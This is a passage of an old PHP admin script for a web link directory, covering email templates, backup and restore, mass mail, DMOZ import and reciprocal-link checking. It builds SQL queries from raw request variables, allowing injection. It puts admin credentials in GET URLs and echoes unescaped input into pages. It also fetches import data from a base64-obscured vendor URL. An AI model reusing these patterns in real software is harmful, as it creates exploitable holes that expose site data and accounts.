                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><input type="text" name="suspendedsubject" size="60" style="font-family: Verdana; font-size: 8pt" value="<?echo fieldize(array_shift(mysql_fetch_row(mysql_query("select subject from lma_emails where id = 'suspended'"))))?>"></font></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Message
                    Body:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><textarea rows="10" name="suspendedbody" cols="60" style="font-family: Verdana; font-size: 8pt"><?echo htmlentities(array_shift(mysql_fetch_row(mysql_query("select body from lma_emails where id = 'suspended'"))))?></textarea></font></td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                      </table>
                    </div>
                </center>
                  <div align="center">
                    <table border="0" cellpadding="4" cellspacing="4" width="85%">
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2"></td>
                      </tr>
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2">
                          <p align="left"><font size="2" face="Tahoma"><b>Import
                          Completed (Sent To Admin)</b></font></p>
                          <p align="left"><font face="Tahoma" size="1">This is
                          the email is sent to you as the administrator when an
                          import has completed. This applies to the DMOZ import feature.</font></td>
                      </tr>
                      <center>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2">
                    <hr size="1" color="#C0C0C0">
                  </td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Subject:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><input type="text" name="importsubject" size="60" style="font-family: Verdana; font-size: 8pt" value="<?echo fieldize(array_shift(mysql_fetch_row(mysql_query("select subject from lma_emails where id = 'import'"))))?>"></font></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Message
                    Body:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><textarea rows="10" name="importbody" cols="60" style="font-family: Verdana; font-size: 8pt"><?echo htmlentities(array_shift(mysql_fetch_row(mysql_query("select body from lma_emails where id = 'import'"))))?></textarea></font></td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                      </table>
                    </div>
                </center>
                                  <div align="center">
                    <table border="0" cellpadding="4" cellspacing="4" width="85%">
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2"></td>
                      </tr>
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2">
                          <p align="left"><font size="2" face="Tahoma"><b>URL
                          Validation Completed (Sent To Admin)</b></font></p>
                          <p align="left"><font face="Tahoma" size="1">This is
                          the email is sent to you as the administrator when the
                          URL Validation process has completed.</font></td>
                      </tr>
                      <center>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2">
                    <hr size="1" color="#C0C0C0">
                  </td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Subject:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><input type="text" name="urlvalidationsubject" size="60" style="font-family: Verdana; font-size: 8pt" value="<?echo fieldize(array_shift(mysql_fetch_row(mysql_query("select subject from lma_emails where id = 'urlvalidation'"))))?>"></font></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Message
                    Body:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><textarea rows="10" name="urlvalidationbody" cols="60" style="font-family: Verdana; font-size: 8pt"><?echo fieldize(array_shift(mysql_fetch_row(mysql_query("select body from lma_emails where id = 'urlvalidation'"))))?></textarea></font></td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                      </table>
                    </div>

                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <p align="center"><font face="Trebuchet MS" size="2"><input type="submit" value="Update Emails" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </div>
    </td>
  </tr>
  </table>
</div>

</form>

<?

	echo $footr;

}

elseif ($action == "updateemails") {

	$pol = mysql_query("update lma_emails set subject = '$confirmsubject', body = '$confirmbody' where id = 'confirm'");
	$pol = mysql_query("update lma_emails set subject = '$approvedsubject', body = '$approvedbody' where id = 'approved'");
	$pol = mysql_query("update lma_emails set subject = '$declinedsubject', body = '$declinedbody' where id = 'declined'");
	$pol = mysql_query("update lma_emails set subject = '$removedsubject', body = '$removedbody' where id = 'removed'");
	$pol = mysql_query("update lma_emails set subject = '$deletedsubject', body = '$deletedbody' where id = 'deleted'");
	$pol = mysql_query("update lma_emails set subject = '$newsubject', body = '$newbody' where id = 'new'");
	$pol = mysql_query("update lma_emails set subject = '$suspendedsubject', body = '$suspendedbody' where id = 'suspended'");
	$pol = mysql_query("update lma_emails set subject = '$importsubject', body = '$importbody' where id = 'import'");
	$pol = mysql_query("update lma_emails set subject = '$addedsubject', body = '$addedbody' where id = 'added'");
	$pol = mysql_query("update lma_emails set subject = '$urlvalidationsubject', body = '$urlvalidationbody' where id = 'urlvalidation'");

	message("Congratulations", "Your system emails were successfully saved");

}

elseif ($action == "backup") {

	echo $headr;

?>

<div align="center">
  <center>
  <table border="1" cellspacing="4" width="650" bgcolor="#F8F8F8" cellpadding="0" bordercolor="#C0C0C0">
  </center>
  <center>
  <tr>
    <td height="20">
    <div align="center">
      <table border="0" cellpadding="6" cellspacing="6" width="100%">
        <tr>
          <td width="100%">
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td>
            <p align="right"><a href="admin.php"><font size="2" face="Tahoma">Main
            Admin</font></a></p>
                </td>
              </tr>
              <tr>
                <td>
            <p align="center"><b><font face="Trebuchet MS" size="4">Backup /
            Restore</font></b></p>
            <p align="left"><font size="2" face="Tahoma">This section
                  allows you to backup your directory database and restore
            previous backups. You'd be wise to do this on a regular basis to
            ensure you can restore your completed directory in a matter of
            minutes in the advent that your Web Host loses the data (trust me,
            it can and does happen). It is also an easy way to transfer the
            directory to another server if you change web hosts.</font></p>
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><u><font size="2" face="Tahoma">Backup
                  Database</font></u></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">Clicking the &quot;Backup
                  Database&quot; button below will create a complete backup of
                  your directory database in a folder called /lma/backups/ on
                  your website server. The file will be called backup-date.txt
                  You should then login via an FTP manager and save the file to
                  your local computer.</font></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
  </center>
            <tr>
              <td><center>
                </center>

                <form action="admin.php" method="post" style="margin: 0px">
                <input type="hidden" name="action" value="backupcreate">

                <p align="center"><font face="Trebuchet MS" size="2"><input type="submit" value="Backup Database Now" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font>
  <center>
              </center>

              </form>


                </td>
              </tr>
            </table>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><u><font size="2" face="Tahoma">Restore
                  Backup</font></u></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">To restore a previous backup, chose one of the
                backup dates below and click on the "Restore Backup" button. If you are restoring
                a backup from a different LMA installation,
                  simply upload the backup file to your "backups" directory and reload
                  this page, then you can chose that backup's date. Clicking the &quot;Restore Backup&quot; button
                  will completely restore your directory to the state it was in
                  when that backup was made.</font>
<?

	$dh = opendir("backups");
	while ($file = readdir($dh)) {

		if (preg_match("/^backup-(.+?)\.bak/i", $file, $res)) {
			$baks[] = $res[1];
		}

	}
	closedir($dh);

	if (count($baks) > 0) {

?><p align="center"><form action="admin.php" method="post" style="margin: 0px">
                <input type="hidden" name="action" value="backuprestore">
                <select name="backup" size=6><?

		$seld = " selected";

		while (list(,$date) = each($baks)) {

			echo "<option value=\"$date\"$seld>$date</option>\n";
			$seld = "";

		}
?>

			</select></p>

			 </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>

			  <tr>
                <td height="20"><center>


                <p align="center"><font size="1" face="Tahoma">
                <input type="submit" value="Restore Backup" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font>
                </p>

                </form>
                </center>
                </td>
              </tr>
<?
	}

else {
?>

		<p align="center"><font face="tahoma" size="2" color="#000088"><br>There are no backup files in the "backup" folder.</font></p>
			 </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>

<?
}

?>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </div>
    </td>
  </tr>
  </table>
</div>

<?

	echo $footr;

}

elseif ($action == "backupcreate") {

	$dat = date("m-d-y");

	$fp = @fopen("backups/backup-$dat.bak", "w");

	if (!$fp) message("Error", "Can't create the file backup-$dat.bak. Please make sure that permissions are set correctly.");

	$pol = mysql_query("select * from lma_categories");

	if (mysql_num_rows($pol) > 0) {

		while ($category = mysql_fetch_row($pol)) {

			fputs($fp, "category|-||-|". implode("|-||-|", $category)."\r\n");

		}

	}

	$pol = mysql_query("select * from lma_links");

	if (mysql_num_rows($pol) > 0) {

		while ($link = mysql_fetch_row($pol)) {

			fputs($fp, "link|-||-|". implode("|-||-|", $link)."\r\n");

		}

	}

	fclose($fp);

	message("Congratulations", "A backup of your directory database was successfully created.");

}

elseif ($action == "backuprestore") {

	if (!$backup) message("Error", "You must select a backup date");
	if (!file_exists("backups/backup-$backup.bak")) message("Error", "That file doesn't exist in the backup folder");

	else {

		$inf = file("backups/backup-$backup.bak");
		while (list(,$l) = each($inf)) {

			$l = mysql_escape_string(trim($l));
			$i = split("\|-\|\|-\|", $l);

			$type = array_shift($i);

			if ($type == "category") {
				$pol = mysql_query("insert into lma_categories values ('".implode("', '", $i)."')");
			}

			elseif ($type == "link") {
				$pol = mysql_query("insert into lma_links values ('".implode("', '", $i)."')");
			}

		}

		message("Congratulations!", "The database was successfully restored from the backup file");

	}

}

elseif ($action == "massmail") {

	ignore_user_abort(1);

	if ($mode == "bg") {

		$fp = fsockopen($_SERVER['SERVER_NAME'], 80);
		fputs($fp, "GET ".$_SERVER['SCRIPT_NAME']."?frombg=yes&user=$user&pass=$pass&action=massmail&mode=screen&subject=".urlencode(stripslashes($subject))."&body=".urlencode(stripslashes($body))."&who=$who HTTP/1.1\r\nAccept: */*\r\nAccept-Language: es-mx\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)\r\nHost: ".$_SERVER['SERVER_NAME']."\r\nConnection: Close\r\n\r\n");
		fclose($fp);

		message("Work in progress...", "Your e-mail is being sent to the selected link partners. You'll receive an e-mail notification once this process is completed.");

	}

	else {

		if ($who == "all") {
			$sqlsrch = "";
		}
		elseif ($who == "active") {
			$sqlsrch = "and (status = '1' or status = '2')";
		}
		elseif ($who == "premium") {
			$sqlsrch = "and premium = 'yes'";
		}
		elseif ($who == "suspended") {
			$sqlsrch = "and status = '4'";
		}

		$polo = mysql_query("select * from lma_links where confirmed = 'yes' and email != '' $sqlsrch");

		if (mysql_num_rows($polo) > 0) {

			Echo "<font face=\"tahoma, verdana\" size=2>Please wait, your e-mail is being sent to your
			partners...<br><br><br>Progress: <span id=\"lmaprog\">0</span>%";

			echo str_repeat(" ", 300);
			flush();

			$total = mysql_num_rows($polo);

			$base = str_replace("admin.php", "", $_SERVER["SCRIPT_NAME"]).$basedir;

			$directoryurl = "http://".$_SERVER['SERVER_NAME']. $base."/";

			while ($pols = mysql_fetch_object($polo)) {

				$ic++;

				if (is_int($ic/2)) {
?>
<script language="JavaScript">
<!--
document.getElementById('lmaprog').innerHTML = '<?echo ceil(($ic*100)/$total)?>';
//-->
</script>
<?
				}

				flush();

				if (ereg("\{LISTING-DETAILS\}", $body)) {

					$listinfo = "
        Title: ".$pols->title."
          URL: ".$pols->url."
  Description: ".$pols->description."
   First Name: ".$pols->firstname."
    Last Name: ".$pols->lastname."
        Email: ".$pols->email."
   Reciprocal: ".$pols->recipurl;

				}
				if (ereg("\{CATEGORY-LINK\}", $body)) {

					$goo = 1;
					$lacat = $pols->category;

					$pol = mysql_fetch_object(mysql_query("select * from lma_categories where id = '$lacat'"));

					$caturl = "/". getindex($pol->name) . ".$pext";

					while ($goo == 1 and $x < 100) {

						$x++;

						$pol = mysql_fetch_object(mysql_query("select * from lma_categories where id = '$lacat'"));
						$caturl = "/".str_replace(" ", "_", $pol->name).$caturl;
						$lacat = $pol->parent;
						if ($pol->parent == "0") $goo = 0;

					}

					$categoryurl = "http://".$_SERVER["SERVER_NAME"].$base.$caturl;

				}


				$subjecttpl = stripslashes($subject);
				$subjecttpl = str_replace("{FIRSTNAME}", stripslashes($pols->firstname), $subjecttpl);
				$subjecttpl = str_replace("{LASTNAME}", stripslashes($pols->lastname), $subjecttpl);
				$subjecttpl = str_replace("{DIRECTORY-LINK}", $directoryurl, $subjecttpl);
				$subjecttpl = str_replace("{CATEGORY-LINK}", $categoryurl, $subjecttpl);

				$bodytpl = stripslashes($body);
				$bodytpl = str_replace("{FIRSTNAME}", stripslashes($pols->firstname), $bodytpl);
				$bodytpl = str_replace("{LASTNAME}", stripslashes($pols->lastname), $bodytpl);
				$bodytpl = str_replace("{DIRECTORY-LINK}", $directoryurl, $bodytpl);
				$bodytpl = str_replace("{CATEGORY-LINK}", $categoryurl, $bodytpl);
				$bodytpl = str_replace("{LISTING-DETAILS}", $listinfo, $bodytpl);
				$bodytpl = str_replace("{RECIP-LINK}", $pols->recipurl, $bodytpl);


				@maill($pols->email, $subjecttpl, $bodytpl, "From: $fromname <$adminemail>");

			}

?>
<script language="JavaScript">
<!--
document.getElementById('lmaprog').innerHTML = '100';
//-->
</script>
<h3>Congratulations!</h3>
Your e-mail was successfully sent to the selected partners.
<?

		}
		else {
			message("Error", "There are no partners to e-mail that match your criteria.");
		}
	}

}



elseif ($action == "dmozgo") {

	$parts = preg_split("/dmoz\.org\//i", $url);

	if (count($parts) < 2) message("Error", "The Dmoz URL you entered is not valid");
	$cat = urldecode($parts[1]);
	$pl = strlen($cat) - 1;
	if ($cat[$pl] == "/") {
		$cat = substr($cat, 0, -1);
	}
	
  if (!$importparent)
    $fircat = 0;
  else
    $fircat = $importparent;

	$clist = @file(base64_decode("aHR0cDovL3d3dy5vbmxpbmVtYXJrZXRpbmd0b2RheS5jb20vbG1hZG1vei9ncmFiLnBocD9jYXQ9").urlencode($cat));
	if (!$clist) message("Sorry", "The Dmoz service is temporarily unavailable");

	if (trim($clist[0]) == "Error") message("Error", $clist[1]);

	if (trim($clist[0]) == "OK") {

		if ($newcatname) {
			$pol = mysql_query("select id from lma_categories where parent = '0' and name = '".str_replace("_", " ", $newcatname)."'");
			if (mysql_num_rows($pol)>0) message("Error", "There already exists a category named '$newcatname'");
			else {
				$pol = mysql_query("insert into lma_categories values(NULL, '0', '".str_replace("_", " ", $newcatname)."', 0)");
				$fircat = mysql_insert_id();
			}
		}

		$ok = array_shift($clist);

		while (list(,$l) = each($clist)) {

			$l = trim($l);
			if ($l != $cat) {
				$temp = split("/", $l);
				$cn = count($temp);
				$catos[$cn][$l] = "";
			}

		}

		$catos2 = $catos;

		$fp = fopen("dmozcats.txt", "w");

		if (count($catos) > 0) {

			if ($fircat != 0) {
				$id = $fircat;
				fputs($fp, "$cat|-|-|$id\r\n");
				$ui++;
			}


			for ($u=1;$u<=15;$u++) {

				reset($catos);

				$nexu = $u + 1;

				if (!is_array($catos[$u])) continue;

				while (list($l,$id) = each($catos[$u])) {

					if (!$id) {
						$pal = mysql_query("select id from lma_categories where parent = '$fircat' and name = '".str_replace("_", " ", $l)."'");
						if ($pal and mysql_num_rows($pal)>0) {
							$id = array_shift(mysql_fetch_row($pal));
						}
						else {
   						// Store the DMOZ category						
              $tlc = mysql_query("select id from lma_toplevelcats where name = '$cat'");
  						if ($tlc and mysql_num_rows($tlc)>0) {
  							$tlcid = array_shift(mysql_fetch_row($tlc));
  						}
  						else {
  							$tlc = mysql_query("insert into lma_toplevelcats values(NULL, '$cat')");
  							$tlcid = mysql_insert_id();
  						}						  
							$pol = mysql_query("insert into lma_categories values(NULL, '$fircat', '".str_replace("_", " ", $l)."', $tlcid )");
							$id = mysql_insert_id();
						}
						fputs($fp, "$cat/$l|-|-|$id\r\n");
						$ui++;
					}

					if (is_array($catos2[($nexu)])) {

						reset($catos2[$nexu]);

						while (list($t,) = each($catos2[$nexu])) {

							if (strpos("o".$t, $l."/") == 1) {

								$tomp = split("/", $t);
								$tnu = count($tomp) - 1;
                // Store the DMOZ category						
                $tlc = mysql_query("select id from lma_toplevelcats where name = '".str_replace("/".$tomp[$tnu], "", $cat."/".$t)."'");
    						if ($tlc and mysql_num_rows($tlc)>0) {
    							$tlcid = array_shift(mysql_fetch_row($tlc));
    						}
    						else {
    							$tlc = mysql_query("insert into lma_toplevelcats values(NULL, '".str_replace("/".$tomp[$tnu], "", $cat."/".$t)."')");
    							$tlcid = mysql_insert_id();
    						}						  
								$pol = mysql_query("insert into lma_categories values(NULL, '$id', '".str_replace("_", " ", $tomp[$tnu])."', $tlcid)");
								$pul = mysql_insert_id();
								$catos[$nexu][$t] = $pul;
								fputs($fp, "$cat/$t|-|-|$pul\r\n");
								$ui++;

							}

						}

					}

				}

			}
		}
		else {
			if ($fircat == 0) {
				$pol = mysql_query("insert into lma_categories values(NULL, '$fircat', '".str_replace("/", ",", str_replace("_", " ", $cat))."', 0)");
				$id = mysql_insert_id();
				$ui++;
			}
			else {
				$id = $fircat;
				$ui++;
			}

			fputs($fp, "$cat|-|-|$id\r\n");
		}

		fclose($fp);

		dolcount();

		if ($what == "cats") {
			//unlink("dmozcats.txt");
			message("Congratulations!", "$ui categories were successfully imported.");
		}
		elseif ($what == "all") {

			$fp = fsockopen($_SERVER['SERVER_NAME'], 80);
			fputs($fp, "GET ".$_SERVER['SCRIPT_NAME']."?user=$user&pass=$pass&action=dmozlinks HTTP/1.1\r\nAccept: */*\r\nAccept-Language: es-mx\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)\r\nHost: ".$_SERVER['SERVER_NAME']."\r\nConnection: Close\r\n\r\n");
			fclose($fp);

			message("Step one completed", "The category structure ($ui categories) was successfully imported.<br><br>The Link Management Assistant has just started
			importing the links from each of the categories. This operation will take a while and you'll receive an e-mail notification when it's finished.");
		}

	}

}

elseif ($action == "dmozlinks") {

	ignore_user_abort(1);

	$dmcats = @file("dmozcats.txt");

	if (count($dmcats) < 1 or !file_exists("dmozcats.txt")) die("There are no unfinished DMOZ imports.");

	while (list(,$ct) = each($dmcats)) {

		$ui++;

		if ($ui < 10) {

			$ct = trim($ct);

			list($caturl,$catid) = split("\|-\|-\|", $ct);

			$page = implode("", file("http://www.dmoz.org/".urlencode($caturl)));

			preg_match_all("/<li><a href=\"http:\/\/(.+?)\">(<b>)?(.+?)(<\/b>)?<\/a>(.+?)- (.+?)\n/is", $page, $res);

			while (list($i,$url) = each($res[1])) {

				$title = $res[3][$i];
				$desc = $res[6][$i];
				$url = "http://$url";

				$pol = mysql_query("insert into lma_links values (NULL, '$catid', '5', 'yes', 'no', '".mysql_escape_string($title)."', '".mysql_escape_string($desc)."', '".mysql_escape_string($url)."', '', '', '', '', '".time()."', '0')");

			}
		}

		else {
			$newmc .= $ct;
		}

	}

	if ($newmc) {

		$fp = fopen("dmozcats.txt", "w");
		fputs($fp, $newmc);
		fclose($fp);

		echo "LMA is now restarting the unfinished DMOZ import. You will receive an e-mail when this process is complete";

		$fp = fsockopen($_SERVER['SERVER_NAME'], 80);
		fputs($fp, "GET ".$_SERVER['SCRIPT_NAME']."?user=$user&pass=$pass&action=dmozlinks HTTP/1.1\r\nAccept: */*\r\nAccept-Language: es-mx\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)\r\nHost: ".$_SERVER['SERVER_NAME']."\r\nConnection: Close\r\n\r\n");
		fclose($fp);

	}

	else {

		dolcount();

		unlink("dmozcats.txt");

		$emtpl = mysql_fetch_object(mysql_query("select subject, body from lma_emails where id = 'import'"));

		$subject = $emtpl->subject;
		$body = $emtpl->body;

		$adminurl = "http://".$_SERVER["SERVER_NAME"].$_SERVER["SCRIPT_NAME"];
		$body = str_replace("{ADMIN-LINK}", $adminurl, $body);

		maill($adminemail, $subject, $body, "From: $fromname <$adminemail>");

	}

}



elseif ($action == "choosecat") {

	if (!$catid) $catid = "0";
?>

<script language="JavaScript">
<!--

function selectcat(cati,catext)
{
	opener.document.getElementById('<?echo $fid?>').options.length = 2;

	opener.document.getElementById('<?echo $fid?>').style.width = '300px';
	opener.document.getElementById('<?echo $fid?>').options[1].value = cati;
	opener.document.getElementById('<?echo $fid?>').options[1].text = catext;
	opener.document.getElementById('<?echo $fid?>').selectedIndex = 1;
	opener.focus();
}
//-->
</script>
<font face="tahoma, verdana" size="2">
<h3>Choose a category</h3>

<?

	if ($catid != "0") {

		$goo = 1;

		$lacat = $catid;

		//$pol = mysql_fetch_object(mysql_query("select * from lma_categories where id = '$lacat' order by name"));

		//$caturl = $pol->name;

		while ($goo == 1 and $x < 100) {

			$x++;

			$pol = mysql_fetch_object(mysql_query("select * from lma_categories where id = '$lacat'"));

			if ($lacat == $catid) {
				$caturl = $pol->name;
				$caturl2 = $pol->name;
			}
			else {
				$caturl = "<a href=\"admin.php?action=choosecat&fid=$fid&catid=".$pol->id."\">".$pol->name ."</a> &gt; ". $caturl;
				$caturl2 = $pol->name."/".$caturl2;
			}

			$lacat = $pol->parent;
			if ($pol->parent == "0") $goo = 0;

		}

		echo "<p><a href=\"admin.php?action=choosecat&fid=$fid&catid=0\">Top</a> &gt; $caturl";
		echo " &nbsp;<font size=1><a href=\"javascript:selectcat('$catid', '$caturl2')\">Select this category</a></font></p><blockquote>";

	}

	$pol = mysql_query("select * from lma_categories where parent = '$catid' order by name");
	if (mysql_num_rows($pol) > 0) {
		while ($scat = mysql_fetch_object($pol)) {

			$goo = 1;

			unset($caturl);

			$lacat = $scat->id;

			while ($goo == 1 and $x < 100) {

				$x++;

				$pols = mysql_fetch_object(mysql_query("select * from lma_categories where id = '$lacat'"));

				if ($lacat == $scat->id) {
					$caturl = $pols->name;
				}
				else {
					$caturl = $pols->name ."/". $caturl;
				}

				$lacat = $pols->parent;
				if ($pols->parent == "0") $goo = 0;

			}


			echo "<p style=\"margin: 3px\"><a href=\"admin.php?action=choosecat&fid=$fid&catid=".$scat->id."\"><img align=left border=0 src=\"folder.jpg\"></a>&nbsp;<a href=\"admin.php?action=choosecat&fid=$fid&catid=".$scat->id."\">".$scat->name."</a> &nbsp;<font size=1><a href=\"javascript:selectcat('".$scat->id."', '$caturl')\">Select</a></font></p>";
		}
	}
	else echo "<p>There are no subcategories under this category</p>";

	echo "</blockquote>";

}


elseif ($action == "linkcheck") {

	ignore_user_abort(1);

	$pol = mysql_query("select * from lma_links where (status = '1' or status = '4') and recipurl != ''");
	if (mysql_num_rows($pol) > 0) {

		$base = str_replace("admin.php", "", $_SERVER["SCRIPT_NAME"]).$basedir;

		while ($link = mysql_fetch_object($pol)) {

			$atts = $link->attempts + 1;

			$page = @file($link->recipurl);

			if ($page) $pagehtml = implode("", $page);

			if (!$page or !ereg($reciplinkurl, $pagehtml)) {


				$listinfo = "
        Title: ".$link->title."
          URL: ".$link->url."
  Description: ".$link->description."
   First Name: ".$link->firstname."
    Last Name: ".$link->lastname."
        Email: ".$link->email."
   Reciprocal: ".$link->recipurl;


				$goo = 1;
				$lacat = $link->category;

				$polulo = mysql_fetch_object(mysql_query("select * from lma_categories where id = '$lacat'"));

				$caturl = "/". getindex($polulo->name) . ".$pext";

				while ($goo == 1 and $x < 100) {

					$x++;

					$polulo = mysql_fetch_object(mysql_query("select * from lma_categories where id = '$lacat'"));
					$caturl = "/".str_replace(" ", "_", $polulo->name).$caturl;
					$lacat = $polulo->parent;
					if ($polulo->parent == "0") $goo = 0;

				}

				$categoryurl = "http://".$_SERVER["SERVER_NAME"].$base.$caturl;

				$directoryurl = "http://".$_SERVER["SERVER_NAME"].$base;


				$plu = mysql_query("update lma_links set attempts = '$atts' where id = '".$link->id."'");

				if ($atts == ($lcheckatt + $lchecknotfound)) {

					if ($lcheckdelete == "yes") {
						$puls = mysql_query("delete from lma_links where id = '".$link->id."'");
					}
					if ($lcheckdeleteemail == "yes") {
						echo "Listing deleted e-mail sent to: ".$link->id."<br>";
						$nftpl = mysql_fetch_object(mysql_query("select subject, body from lma_emails where id = 'deleted'"));

						$subjecttpl = $nftpl->subject;
						$subjecttpl = str_replace("{FIRSTNAME}", stripslashes($link->firstname), $subjecttpl);
						$subjecttpl = str_replace("{LASTNAME}", stripslashes($link->lastname), $subjecttpl);
						$subjecttpl = str_replace("{DIRECTORY-LINK}", $directoryurl, $subjecttpl);
						$subjecttpl = str_replace("{CATEGORY-LINK}", $categoryurl, $subjecttpl);

						$bodytpl = $nftpl->body;
						$bodytpl = str_replace("{FIRSTNAME}", stripslashes($link->firstname), $bodytpl);
						$bodytpl = str_replace("{LASTNAME}", stripslashes($link->lastname), $bodytpl);
						$bodytpl = str_replace("{DIRECTORY-LINK}", $directoryurl, $bodytpl);
						$bodytpl = str_replace("{CATEGORY-LINK}", $categoryurl, $bodytpl);
						$bodytpl = str_replace("{LISTING-DETAILS}", $listinfo, $bodytpl);
						$bodytpl = str_replace("{RECIP-LINK}", $link->recipurl, $bodytpl);


						@maill($link->email, $subjecttpl, $bodytpl, "From: $fromname <$adminemail>");
					}

				}
				elseif ($atts == $lcheckatt) {

					if ($lchecksuspend == "yes") {
						$puls = mysql_query("update lma_links set status = '4' where id = '".$link->id."'");

					}
					if ($lcheckemail == "yes") {
						echo "Listing suspended e-mail sent to: ".$link->id."<br>";
						$nftpl = mysql_fetch_object(mysql_query("select subject, body from lma_emails where id = 'suspended'"));

						$subjecttpl = $nftpl->subject;
						$subjecttpl = str_replace("{FIRSTNAME}", stripslashes($link->firstname), $subjecttpl);
						$subjecttpl = str_replace("{LASTNAME}", stripslashes($link->lastname), $subjecttpl);
						$subjecttpl = str_replace("{DIRECTORY-LINK}", $directoryurl, $subjecttpl);
						$subjecttpl = str_replace("{CATEGORY-LINK}", $categoryurl, $subjecttpl);

						$bodytpl = $nftpl->body;
						$bodytpl = str_replace("{FIRSTNAME}", stripslashes($link->firstname), $bodytpl);
						$bodytpl = str_replace("{LASTNAME}", stripslashes($link->lastname), $bodytpl);
						$bodytpl = str_replace("{DIRECTORY-LINK}", $directoryurl, $bodytpl);
						$bodytpl = str_replace("{CATEGORY-LINK}", $categoryurl, $bodytpl);
						$bodytpl = str_replace("{LISTING-DETAILS}", $listinfo, $bodytpl);
						$bodytpl = str_replace("{RECIP-LINK}", $link->recipurl, $bodytpl);
						$bodytpl = str_replace("{ADMIN-LINK}", "http://".$_SERVER["SERVER_NAME"].$_SERVER["SCRIPT_NAME"], $bodytpl);


						@maill($adminemail, $subjecttpl, $bodytpl, "From: $fromname <$adminemail>");


						$checkper = ($lchecknotfound - $atts) * $linkcheck;

						$nftpl = mysql_fetch_object(mysql_query("select subject, body from lma_emails where id = 'removed'"));

						$subjecttpl = $nftpl->subject;
						$subjecttpl = str_replace("{FIRSTNAME}", stripslashes($link->firstname), $subjecttpl);
						$subjecttpl = str_replace("{LASTNAME}", stripslashes($link->lastname), $subjecttpl);
						$subjecttpl = str_replace("{DIRECTORY-LINK}", $directoryurl, $subjecttpl);
						$subjecttpl = str_replace("{CATEGORY-LINK}", $categoryurl, $subjecttpl);
						$subjecttpl = str_replace("{CHECKING-PERIOD}", $checkper, $subjecttpl);

						$bodytpl = $nftpl->body;
						$bodytpl = str_replace("{FIRSTNAME}", stripslashes($link->firstname), $bodytpl);
						$bodytpl = str_replace("{LASTNAME}", stripslashes($link->lastname), $bodytpl);
						$bodytpl = str_replace("{DIRECTORY-LINK}", $directoryurl, $bodytpl);
						$bodytpl = str_replace("{CATEGORY-LINK}", $categoryurl, $bodytpl);
						$bodytpl = str_replace("{LISTING-DETAILS}", $listinfo, $bodytpl);
						$bodytpl = str_replace("{RECIP-LINK}", $link->recipurl, $bodytpl);
						$bodytpl = str_replace("{CHECKING-PERIOD}", $checkper, $bodytpl);


						@maill($link->email, $subjecttpl, $bodytpl, "From: $fromname <$adminemail>");

					}

				}


			}
		}

		echo "OK";

	}

}

if ($link) mysql_close($link);

}


?>